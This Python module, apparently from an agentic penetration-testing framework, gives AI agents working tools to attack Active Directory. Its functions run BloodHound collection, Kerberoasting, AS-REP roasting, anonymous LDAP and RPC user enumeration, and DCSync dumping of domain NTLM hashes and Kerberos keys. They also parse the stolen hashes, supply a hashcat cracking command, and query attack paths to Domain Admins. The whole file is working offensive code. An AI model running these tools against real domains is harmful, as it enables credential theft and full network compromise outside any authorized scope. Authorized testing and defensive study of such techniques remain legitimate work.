"""
KRYON Active Directory Attack Module
======================================

Implements Active Directory attack techniques for penetration testing
of Windows domain environments. Covers reconnaissance, credential
harvesting, privilege escalation, and lateral movement via AD.

Tools:
- bloodhound_collect: BloodHound data collection for attack path analysis
- kerberoast: Extract TGS tickets for offline cracking (Kerberoasting)
- asreproast: Find accounts without Kerberos pre-auth (AS-REP Roasting)
- enumerate_ad: Comprehensive AD enumeration (users, groups, GPOs, trusts)
- dcsync_attack: DCSync to extract domain hashes via replication
- find_attack_path: Query BloodHound for shortest attack paths to targets

Primary Users:
- Pentest Agent (Alpha-Red): Domain privilege escalation
- Network Analyst (Alpha-Silver): AD reconnaissance

Authorization: Only use within authorized penetration testing scope.
"""

import json
import os
import re
import shlex
import subprocess  # nosec B404

from kryon.sdk.agents import function_tool

_CYPHER_SAFE = re.compile(r"^[A-Za-z0-9@.\-\\_ ]+$")

# T4-A7: the file that bridges enumerate_ad → asreproast. enumerate_ad writes the
# discovered sAMAccountNames here; asreproast reads it as GetNPUsers.py's -usersfile.
# Before this fix nobody wrote it, so the AS-REP step ran against a nonexistent list
# and the enumerate→roast chain silently produced nothing.
_AD_USERS_FILE = "/tmp/ad_users.txt"


def _run_cmd(command: str, timeout: int = 120) -> str:
    """Execute a shell command and return combined stdout+stderr."""
    try:
        result = subprocess.run(  # nosec B602
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Error: Command timed out"
    except Exception as e:
        return f"Error: {e}"


@function_tool(strict_mode=False)
def bloodhound_collect(target_domain: str, method: str = "all") -> str:
    """
    Run BloodHound-python collector to gather Active Directory relationship
    data for attack path analysis. Collects users, groups, sessions, ACLs,
    trusts, and computer information from the domain.

    The collected data can be imported into BloodHound for graph-based
    attack path visualization and analysis.

    Args:
        target_domain: Target AD domain (e.g. corp.local)
        method: Collection method — one of: all, sessions, trusts, acl,
                group, localadmin, psremote, dcom, rdp, objectprops,
                container. Defaults to "all".

    Returns:
        str: JSON with collection stats (files generated, object counts)

    Examples:
        bloodhound_collect(target_domain="corp.local")
        bloodhound_collect(target_domain="corp.local", method="sessions")
        bloodhound_collect(target_domain="internal.company.com", method="acl")
    """
    valid_methods = {
        "all",
        "sessions",
        "trusts",
        "acl",
        "group",
        "localadmin",
        "psremote",
        "dcom",
        "rdp",
        "objectprops",
        "container",
    }
    if method not in valid_methods:
        return json.dumps({"error": f"Invalid method '{method}'. Valid: {sorted(valid_methods)}"})

    output_dir = "/tmp/bloodhound"
    cmd = f"bloodhound-python -d {shlex.quote(target_domain)} -c {method} --zip -o {shlex.quote(output_dir)}"

    raw_output = _run_cmd(cmd, timeout=300)

    # Parse collection statistics from output
    result = {
        "tool": "bloodhound-python",
        "domain": target_domain,
        "method": method,
        "output_dir": output_dir,
        "output": raw_output,
    }

    # Try to extract counts from output lines
    counts = {}
    for line in raw_output.split("\n"):
        line_lower = line.lower()
        for obj_type in ["users", "computers", "groups", "domains", "gpos", "ous"]:
            if obj_type in line_lower and ("found" in line_lower or "done" in line_lower):
                counts[obj_type] = line.strip()
    if counts:
        result["counts"] = counts

    return json.dumps(result)


@function_tool(strict_mode=False)
def kerberoast(
    domain_controller: str,
    domain: str,
    username: str = "",
    password: str = "",
) -> str:
    """
    Perform Kerberoasting attack using GetUserSPNs.py to request
    TGS tickets for service accounts. The extracted tickets contain hashes
    that can be cracked offline to recover service account passwords.

    Targets accounts with Service Principal Names (SPNs) set in Active
    Directory. Service accounts often have weak passwords and elevated
    privileges, making this a high-value attack.

    Args:
        domain_controller: Domain controller IP or hostname (e.g. dc01.corp.local)
        domain: AD domain name (e.g. corp.local)
        username: Username for authentication (domain user)
        password: Password for authentication

    Returns:
        str: JSON with extracted TGS tickets, SPNs, and crackable hashes

    Examples:
        kerberoast(
            domain_controller="dc01.corp.local",
            domain="corp.local",
            username="jdoe",
            password="<REDACTED>"
        )
    """
    cred = (
        f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}"
        if username
        else f"{shlex.quote(domain)}/"
    )
    cmd_parts = [
        "GetUserSPNs.py",
        cred,
        f"-dc-ip {shlex.quote(domain_controller)}",
        "-request",
        "-outputfile /tmp/kerberoast_hashes.txt",
    ]

    cmd = " ".join(cmd_parts)
    raw_output = _run_cmd(cmd, timeout=120)

    # Parse tickets from output. T4-M11: the old loop computed an SPN into a local
    # `current_ticket` dict that was NEVER stored — every SPN was discarded and each
    # ticket was just {"hash": ...}. The $krb5tgs$ hash itself embeds the account and
    # SPN (`$krb5tgs$<etype>$*<account>$<REALM>$<SPN>*$<hash>`), so extract them; also
    # keep the table's SPN column instead of throwing it away.
    tickets = []
    spns: list[str] = []
    _KRB_RE = re.compile(r"\$krb5tgs\$\d+\$\*([^$]+)\$([^$]+)\$([^*]+)\*")
    for line in raw_output.split("\n"):
        s = line.strip()
        if "$krb5tgs$" in s:
            m = _KRB_RE.search(s)
            tickets.append(
                {
                    "hash": s,
                    "account": m.group(1) if m else "",
                    "spn": m.group(3) if m else "",
                }
            )
        elif s and "/" in s and "@" not in s and "ServicePrincipalName" not in s and not s.startswith("-"):
            # Table SPN line, e.g. "MSSQLSvc/sql01.corp.local:1433  svc_sql  ..."
            spn = s.split()[0]
            if spn not in spns:
                spns.append(spn)

    result = {
        "tool": "GetUserSPNs.py",
        "domain_controller": domain_controller,
        "domain": domain,
        "tickets": tickets,
        "ticket_count": len(tickets),
        "spns": spns,
        "output": raw_output,
        "hashfile": "/tmp/kerberoast_hashes.txt",
    }

    return json.dumps(result)


@function_tool(strict_mode=False)
def asreproast(domain_controller: str, domain: str) -> str:
    """
    Perform AS-REP Roasting attack using GetNPUsers.py to find
    accounts that do not require Kerberos pre-authentication. These
    accounts can have their AS-REP encrypted data requested and cracked
    offline without any credentials.

    This attack targets accounts with the DONT_REQUIRE_PREAUTH flag set
    in Active Directory. The extracted AS-REP hashes can be cracked with
    hashcat mode 18200.

    Args:
        domain_controller: Domain controller IP or hostname
        domain: AD domain name (e.g. corp.local)

    Returns:
        str: JSON with vulnerable accounts and AS-REP hashes

    Examples:
        asreproast(domain_controller="dc01.corp.local", domain="corp.local")
    """
    # T4-A7: AS-REP roasting with -no-pass needs a candidate userlist. That list is
    # produced by enumerate_ad (_AD_USERS_FILE). If it isn't there, fail with a clear
    # next-step instead of invoking GetNPUsers.py against a nonexistent file.
    if not os.path.isfile(_AD_USERS_FILE):
        return json.dumps(
            {
                "tool": "GetNPUsers.py",
                "domain_controller": domain_controller,
                "domain": domain,
                "error": f"no userlist at {_AD_USERS_FILE}",
                "next_step": "run enumerate_ad first to produce the userlist, then retry asreproast",
                "vulnerable_accounts": [],
                "hashes": [],
                "hash_count": 0,
            }
        )

    cmd = (
        f"GetNPUsers.py {shlex.quote(domain)}/ "
        f"-dc-ip {shlex.quote(domain_controller)} "
        f"-no-pass -usersfile {shlex.quote(_AD_USERS_FILE)} "
        f"-format hashcat -outputfile /tmp/asrep_hashes.txt"
    )

    raw_output = _run_cmd(cmd, timeout=120)

    # Parse vulnerable accounts and hashes
    vulnerable_accounts = []
    hashes = []
    for line in raw_output.split("\n"):
        if "$krb5asrep$" in line:
            hashes.append(line.strip())
            # Extract username from hash
            try:
                user_part = line.split("$")[3]
                if "@" in user_part:
                    vulnerable_accounts.append(user_part.split("@")[0])
            except (IndexError, ValueError):
                pass
        elif "DONT_REQUIRE_PREAUTH" in line:
            parts = line.strip().split()
            if parts:
                vulnerable_accounts.append(parts[0])

    result = {
        "tool": "GetNPUsers.py",
        "domain_controller": domain_controller,
        "domain": domain,
        "vulnerable_accounts": vulnerable_accounts,
        "hashes": hashes,
        "hash_count": len(hashes),
        "output": raw_output,
        "hashfile": "/tmp/asrep_hashes.txt",
        "crack_command": "hashcat -m 18200 /tmp/asrep_hashes.txt wordlist.txt",
    }

    return json.dumps(result)


@function_tool(strict_mode=False)
def enumerate_ad(
    domain_controller: str,
    domain: str,
    username: str = "",
    password: str = "",
) -> str:
    """
    Comprehensive Active Directory enumeration combining multiple tools
    to extract users, groups, computers, GPOs, trusts, and other AD objects.

    Uses enum4linux-ng for basic enumeration, ldapdomaindump for LDAP data,
    and rpcclient for RPC-based queries. Provides a complete picture of the
    domain structure for attack planning.

    Args:
        domain_controller: Domain controller IP or hostname
        domain: AD domain name (e.g. corp.local)
        username: Username for authenticated enumeration (optional)
        password: Password for authenticated enumeration (optional)

    Returns:
        str: JSON with users, groups, computers, GPOs, trusts, and shares

    Examples:
        enumerate_ad(domain_controller="dc01.corp.local", domain="corp.local")
        enumerate_ad(
            domain_controller="10.10.10.100",
            domain="corp.local",
            username="jdoe",
            password="<REDACTED>"
        )
    """
    results = {
        "tool": "ad-enumeration",
        "domain_controller": domain_controller,
        "domain": domain,
        "users": [],
        "groups": [],
        "computers": [],
        "gpos": [],
        "trusts": [],
        "shares": [],
        "output": {},
    }

    # 1. enum4linux-ng for basic enumeration
    safe_dc = shlex.quote(domain_controller)
    if username and password:
        enum_cmd = f"enum4linux-ng -A -u {shlex.quote(username)} -p {shlex.quote(password)} {safe_dc}"
    else:
        enum_cmd = f"enum4linux-ng -A {safe_dc}"

    enum_output = _run_cmd(enum_cmd, timeout=180)
    results["output"]["enum4linux"] = enum_output

    # Parse users and groups from enum4linux output. T4-M11: the loop only matched the
    # legacy Perl enum4linux format (`user:[name]`), but the command invoked is
    # enum4linux-**ng** (Python), whose text output uses `username:`/`groupname:` keys —
    # so on a modern box every user/group was missed here (only the ldapsearch fallback
    # below saved it). Match BOTH formats.
    for line in enum_output.split("\n"):
        low = line.lower()
        stripped = line.strip()
        if "user:" in low and "[" in line:  # legacy enum4linux: user:[name] rid:[0x..]
            parts = stripped.split("[")
            if len(parts) >= 2:
                # Take up to the first ']' — the trailing " rid:[0x..]" must not leak in.
                user = parts[1].split("]")[0].strip()
                if user and user not in results["users"]:
                    results["users"].append(user)
        elif low.lstrip().startswith("username:"):  # enum4linux-ng: username: name
            user = stripped.split(":", 1)[1].strip().strip("'\"")
            if user and user not in results["users"]:
                results["users"].append(user)
        if "group:" in low and "[" in line:  # legacy: group:[name] rid:[0x..]
            parts = stripped.split("[")
            if len(parts) >= 2:
                group = parts[1].split("]")[0].strip()
                if group and group not in results["groups"]:
                    results["groups"].append(group)
        elif low.lstrip().startswith("groupname:"):  # ng: groupname: name
            group = stripped.split(":", 1)[1].strip().strip("'\"")
            if group and group not in results["groups"]:
                results["groups"].append(group)

    # 1.5 Anonymous LDAP user enumeration — modern AD restricts anonymous RPC/SAMR (enum4linux +
    # rpcclient enumdomusers return access-denied), but LDAP anonymous READ is frequently still allowed.
    # This is the path that works on e.g. THM Operation Endgame, where `ldapsearch -x` lists 330 users
    # while enum4linux/rpcclient get nothing. Derive the base DN from the domain and pull sAMAccountName.
    base_dn = ",".join(f"DC={part}" for part in domain.split(".") if part)
    if base_dn:
        if username and password:
            bind = f"-D {shlex.quote(f'{username}@{domain}')} -w {shlex.quote(password)}"
        else:
            bind = "-x"  # anonymous simple bind
        ldsearch_cmd = (
            f"ldapsearch {bind} -H ldap://{safe_dc} -b {shlex.quote(base_dn)} "
            f"'(&(objectClass=user)(objectCategory=person))' sAMAccountName"
        )
        ldsearch_output = _run_cmd(ldsearch_cmd, timeout=120)
        results["output"]["ldapsearch_users"] = ldsearch_output[:4000]
        for line in ldsearch_output.split("\n"):
            if line.lower().startswith("samaccountname:"):
                user = line.split(":", 1)[1].strip()
                # drop machine accounts ($) and empties; keep human users for AS-REP/spray
                if user and not user.endswith("$") and user not in results["users"]:
                    results["users"].append(user)

    # 2. ldapdomaindump for LDAP data
    if username and password:
        ldap_cmd = (
            f"ldapdomaindump {safe_dc} "
            f"-u {shlex.quote(domain + chr(92) + username)} -p {shlex.quote(password)} "
            f"-o /tmp/ldapdomaindump/"
        )
    else:
        ldap_cmd = f"ldapdomaindump {safe_dc} -o /tmp/ldapdomaindump/"

    ldap_output = _run_cmd(ldap_cmd, timeout=180)
    results["output"]["ldapdomaindump"] = ldap_output

    # 3. rpcclient for RPC-based queries (users, groups)
    if username and password:
        rpc_base = f"rpcclient -U {shlex.quote(f'{domain}/{username}%{password}')} {safe_dc}"
    else:
        rpc_base = f"rpcclient -U '' -N {safe_dc}"

    # Enumerate domain users via RPC
    rpc_users_cmd = f'{rpc_base} -c "enumdomusers"'
    rpc_users_output = _run_cmd(rpc_users_cmd, timeout=60)
    results["output"]["rpcclient_users"] = rpc_users_output

    for line in rpc_users_output.split("\n"):
        if "user:" in line.lower() and "rid:" in line.lower():
            try:
                user = line.split("[")[1].split("]")[0]
                if user and user not in results["users"]:
                    results["users"].append(user)
            except (IndexError, ValueError):
                pass

    # Enumerate domain groups via RPC
    rpc_groups_cmd = f'{rpc_base} -c "enumdomgroups"'
    rpc_groups_output = _run_cmd(rpc_groups_cmd, timeout=60)
    results["output"]["rpcclient_groups"] = rpc_groups_output

    for line in rpc_groups_output.split("\n"):
        if "group:" in line.lower() and "rid:" in line.lower():
            try:
                group = line.split("[")[1].split("]")[0]
                if group and group not in results["groups"]:
                    results["groups"].append(group)
            except (IndexError, ValueError):
                pass

    results["user_count"] = len(results["users"])
    results["group_count"] = len(results["groups"])

    # T4-A7: persist the discovered users so asreproast/kerberoast can consume them
    # as a -usersfile. Best-effort — a write failure must not break enumeration.
    if results["users"]:
        try:
            with open(_AD_USERS_FILE, "w", encoding="utf-8") as fh:
                fh.write("\n".join(results["users"]) + "\n")
            results["users_file"] = _AD_USERS_FILE
        except OSError:
            results["users_file"] = ""

    return json.dumps(results)


@function_tool(strict_mode=False)
def dcsync_attack(
    domain_controller: str,
    domain: str,
    username: str,
    password: str,
) -> str:
    """
    Perform DCSync attack using secretsdump.py to replicate
    domain credentials via the MS-DRSR protocol. Extracts NTLM hashes,
    Kerberos keys, and cached credentials from the domain controller.

    Requires Domain Admin privileges or accounts with Replicating Directory
    Changes / Replicating Directory Changes All rights. This is one of the
    most powerful post-exploitation techniques in AD environments.

    Args:
        domain_controller: Domain controller IP or hostname
        domain: AD domain name (e.g. corp.local)
        username: Username with replication rights (typically Domain Admin)
        password: Password for the account

    Returns:
        str: JSON with extracted NTLM hashes, Kerberos keys, and credentials

    Examples:
        dcsync_attack(
            domain_controller="dc01.corp.local",
            domain="corp.local",
            username="Administrator",
            password="<REDACTED>"
        )
    """
    cmd = (
        f"secretsdump.py "
        f"{shlex.quote(f'{domain}/{username}:{password}')}@{shlex.quote(domain_controller)} "
        f"-outputfile /tmp/dcsync_dump"
    )

    raw_output = _run_cmd(cmd, timeout=300)

    # Parse hashes from output
    ntlm_hashes = []
    kerberos_keys = []
    for line in raw_output.split("\n"):
        line = line.strip()
        # NTLM hash format: user:rid:lmhash:nthash:::
        if ":::" in line and ":" in line:
            parts = line.split(":")
            if len(parts) >= 4:
                ntlm_hashes.append(
                    {
                        "account": parts[0],
                        "rid": parts[1],
                        "lm_hash": parts[2],
                        "nt_hash": parts[3],
                    }
                )
        # Kerberos keys
        elif "aes256-cts" in line.lower() or "aes128-cts" in line.lower():
            kerberos_keys.append(line)
        elif "des-cbc" in line.lower():
            kerberos_keys.append(line)

    result = {
        "tool": "secretsdump.py",
        "domain_controller": domain_controller,
        "domain": domain,
        "ntlm_hashes": ntlm_hashes,
        "kerberos_keys": kerberos_keys,
        "hash_count": len(ntlm_hashes),
        "output": raw_output,
        "dump_files": {
            "ntds": "/tmp/dcsync_dump.ntds",
            "sam": "/tmp/dcsync_dump.sam",
            "secrets": "/tmp/dcsync_dump.secrets",
        },
    }

    return json.dumps(result)


@function_tool(strict_mode=False)
def find_attack_path(
    start_node: str,
    target_node: str = "Domain Admins",
) -> str:
    """
    Query BloodHound Neo4j database for the shortest attack path between
    two nodes in the Active Directory graph. Uses Cypher queries to find
    paths through group memberships, ACLs, sessions, and other AD
    relationships.

    Requires BloodHound data to be collected and imported into Neo4j.
    The Neo4j database should be accessible at bolt://localhost:7687.

    Args:
        start_node: Starting node — user or computer (e.g. user@corp.local)
        target_node: Target node — typically a high-value group or user
                     (default: "Domain Admins")

    Returns:
        str: JSON with attack path nodes, relationships, and hop count

    Examples:
        find_attack_path(start_node="jdoe@CORP.LOCAL")
        find_attack_path(
            start_node="jdoe@CORP.LOCAL",
            target_node="Enterprise Admins@CORP.LOCAL"
        )
        find_attack_path(
            start_node="WS01.CORP.LOCAL",
            target_node="Domain Admins@CORP.LOCAL"
        )
    """
    # Validate inputs against Cypher injection
    if not _CYPHER_SAFE.match(start_node) or not _CYPHER_SAFE.match(target_node):
        return json.dumps({"error": "Invalid characters in node name."})

    # Cypher query for shortest path in BloodHound
    cypher_query = (
        f"MATCH p=shortestPath("
        f"(a {{name:'{start_node.upper()}'}})"
        f"-[*1..]->"
        f"(b {{name:'{target_node.upper()}'}}))"
        f" RETURN p"
    )

    # Try neo4j-client CLI
    _neo4j_pass = os.environ.get("NEO4J_PASSWORD", "bloodhound")
    cmd = f"cypher-shell -u neo4j -p {shlex.quote(_neo4j_pass)} -a bolt://localhost:7687 {shlex.quote(cypher_query)}"

    raw_output = _run_cmd(cmd, timeout=60)

    # Parse path from output
    paths = []
    nodes = []
    relationships = []

    try:
        # Attempt to parse structured output
        parsed = json.loads(raw_output)
        if isinstance(parsed, dict) and "paths" in parsed:
            paths = parsed["paths"]
    except (json.JSONDecodeError, ValueError):
        # Parse text output — extract node names and relationships
        for line in raw_output.split("\n"):
            line = line.strip()
            if not line or line.startswith("+") or line.startswith("|"):
                continue
            if "->" in line or "-[" in line:
                # Relationship line
                parts = line.replace("->", " -> ").split()
                for part in parts:
                    part_clean = part.strip("()[]\"'")
                    if part_clean and part_clean != "->":
                        if ":" in part_clean and not part_clean.startswith(":"):
                            relationships.append(part_clean)
                        elif part_clean not in ["", "->"]:
                            nodes.append(part_clean)
            elif line and not line.startswith("Error"):
                nodes.append(line)

    result = {
        "tool": "bloodhound-cypher",
        "start_node": start_node,
        "target_node": target_node,
        "cypher_query": cypher_query,
        "paths": paths
        if paths
        else [
            {
                "start": start_node,
                "end": target_node,
                "nodes": nodes,
                "relationships": relationships,
                "hops": max(len(nodes) - 1, 0) if nodes else 0,
            }
        ],
        "output": raw_output,
    }

    return json.dumps(result)
